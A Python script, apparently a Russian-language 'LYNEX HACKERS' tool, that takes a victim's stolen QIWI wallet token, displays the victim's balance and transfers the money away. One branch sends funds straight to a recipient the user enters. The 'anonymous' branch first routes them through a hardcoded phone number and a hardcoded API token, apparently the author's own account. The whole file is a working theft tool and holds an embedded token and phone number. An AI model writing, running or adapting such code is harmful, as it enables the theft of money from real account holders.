from SimpleQIWI import *
import time

# Данные
token1 = "a59c970c2e8be1e57fc2b3d5ce95bcb7"
phone = "-"

# Логотип
print("-----------------------")
print("| <//LYNEX HACKERS//> |")
print("-----------------------")
print("[SimpleQIWI / coded by p1mpus]")
print("")    

# Авторизация
token = input("Токен QIWI жертвы: ")
print("")
api = QApi(token=token, phone=phone)
print("Баланс QIWI жертвы: ")
print(api.balance)
print("")

# Снятие денег
vop = input("Сделать анонимный перевод? y/n: ")
if vop == "y":
	a = input("Номер QIWI получателя: ") 
	s = input("Сумма перевода: ")
	c = input("Комментарий: ")
	print("")
	print("Перевод на анонимный QIWI...")
	api.pay(account="+79043370635", amount=s, comment=c)
	time.sleep(5)
	print("Перевод на анонимный QIWI [OK]")
	print("\nПеревод на ваш QIWI...")
	api = QApi(token=token1, phone=phone)
	api.pay(account=a, amount=s, comment=c)
	time.sleep(5)
	print("Перевод на ваш QIWI [OK]")
	api = QApi(token=token, phone=phone)
	print("")
	print("Успешный перевод!")
	print("Вы сняли: " + s + " рублей")
	print("Баланс QIWI жертвы: ")
	print(api.balance)
	input()
elif vop == "n":
	a = input("Номер QIWI получателя: ") 
	s = input("Сумма перевода: ")
	c = input("Комментарий: ")
	print("")
	api.pay(account=a, amount=s, comment=c)
	print("Перевод на ваш QIWI...")
	time.sleep(5)
	print("Перевод на ваш QIWI [OK]")
	print("")
	print("Успешный перевод!")
	print("Вы сняли: " + s + " рублей")
	print("Баланс QIWI жертвы: ")
	print(api.balance)
	input()
else:
	print("ОШИБКА!")
	input()